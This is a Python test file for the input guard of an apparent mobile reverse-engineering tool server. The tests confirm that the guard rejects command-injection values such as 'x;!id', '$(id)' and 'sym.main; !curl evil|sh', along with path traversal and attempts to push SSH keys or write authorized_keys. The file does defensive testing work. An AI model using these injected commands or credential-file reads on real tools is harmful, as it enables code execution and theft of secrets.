import pytest

from mobile_re_mcp import guard


def refused(tool, args):
    with pytest.raises(guard.GuardError):
        guard.validate(tool, args)


@pytest.mark.parametrize("target", ["x;!id", "0x0;!id", "sym.main; !curl evil|sh", "a b", "$(id)", "", "x\nid"])
def test_native_disasm_rejects_radare_syntax(target):
    refused("native_disasm", {"so_path": "/x/lib.so", "target": target})


@pytest.mark.parametrize("target", ["main", "Java_com_example_Foo_bar", "0x1f40", "_ZN3foo3barEv", "JNI_OnLoad"])
def test_native_disasm_accepts_symbols_and_offsets(target):
    assert guard.validate("native_disasm", {"so_path": "/x/lib.so", "target": target})["target"] == target


def test_path_must_not_start_with_dash():
    refused("apk_decompile", {"apk_path": "--help"})
    refused("search_strings", {"path": "-x", "pattern": "a"})


def test_path_rejects_protected_locations(isolated_env):
    refused("adb_push", {"local": str(isolated_env / ".ssh" / "id_ed25519"), "remote": "/sdcard/x"})
    refused("adb_pull", {"local": str(isolated_env / ".bashrc"), "remote": "/sdcard/x"})
    refused("adb_push", {"local": "~/.config/gh/hosts.yml", "remote": "/sdcard/x"})


def test_symlink_into_protected_location_is_refused(isolated_env, tmp_path):
    (isolated_env / ".ssh").mkdir()
    link = tmp_path / "innocent.txt"
    link.symlink_to(isolated_env / ".ssh")
    refused("adb_push", {"local": str(link), "remote": "/sdcard/x"})


def test_allowed_dirs(tmp_path, monkeypatch):
    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.setenv("MOBILE_RE_MCP_ALLOWED_DIRS", str(work))
    guard.validate("apk_identify", {"apk_path": str(work / "a.apk")})
    refused("apk_identify", {"apk_path": str(tmp_path / "other.apk")})
    refused("apk_identify", {"apk_path": str(work / ".." / "other.apk")})


def test_output_suffixes():
    guard.validate("mitm_export_har", {"output_path": "/tmp/x/out.har"})
    refused("mitm_export_har", {"output_path": "/tmp/x/authorized_keys"})
    refused("scrcpy_screenshot", {"output_path": "/tmp/x/shot.sh"})


def test_package_and_serial_and_port():
    guard.validate("frida_attach", {"package": "com.example.app"})
    guard.validate("frida_attach", {"package": "com.example.app:service", "serial": "192.168.1.5:5555"})
    refused("frida_attach", {"package": "com.example; id"})
    refused("memory_read", {"package": "../../etc"})
    refused("memory_read", {"package": "/etc"})
    refused("adb_shell", {"command": "id", "serial": "-s evil"})
    refused("mitm_start", {"port": 22})
    refused("mitm_start", {"port": "abc"})


def test_frida_server_push_arguments():
    guard.validate("frida_server_push", {"abi": "arm64", "remote_path": "/data/local/tmp/frida-server"})
    refused("frida_server_push", {"remote_path": "/data/local/tmp/x; id"})
    refused("frida_server_push", {"abi": "../../bin"})


def test_install_tool_is_off_by_default(monkeypatch):
    refused("install_tool", {"tool_name": "jadx"})
    monkeypatch.setenv("MOBILE_RE_MCP_ALLOW_INSTALL", "1")
    guard.validate("install_tool", {"tool_name": "jadx"})


def test_disable_tools_env(monkeypatch):
    monkeypatch.setenv("MOBILE_RE_MCP_DISABLE_TOOLS", "adb_shell, frida_inject")
    refused("adb_shell", {"command": "id"})
    refused("frida_inject", {"script": "1"})
    guard.validate("adb_devices", {})


def test_arguments_must_be_an_object():
    refused("adb_devices", ["x"])
